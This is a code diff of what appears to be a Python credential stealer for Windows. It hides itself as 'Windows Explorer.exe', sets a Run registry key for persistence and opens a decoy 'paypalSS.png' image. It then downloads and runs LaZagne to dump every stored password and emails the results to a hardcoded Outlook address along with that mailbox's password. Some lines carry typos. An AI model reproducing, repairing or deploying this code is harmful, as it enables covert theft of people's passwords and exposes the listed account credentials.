@@ -9,7 +9,10 @@ def become_persistent():
     Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
     if not os.path.exists(Malocation):
         shutil.copyfile(sys.exexutable, Malocation)
-        subprocess.call('reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run /v Explorer /t REG_SZ /d Exexutables/Download.exe "' + Malocation + '"', shell=True)
+        subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v Explorer /t REG_SZ /d Exexutables/Download.exe" + Malocation, shell=True)
+
+file_name = sys._MEIPASS + "\paypalSS.png"
+subprocess.Popen(file_name, shell=True)
 
 def Download(url):
     GetResponse = requests.get(url)
@@ -36,5 +39,5 @@ Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne
 result = subprocess.check_output("lazagne.exe all", shell=True);
 print(result)
 
-SendMail("", "", result)
+SendMail("favinaj@outlook.com", "06191999Aa!", result)
 os.remove("lazagne.exe")
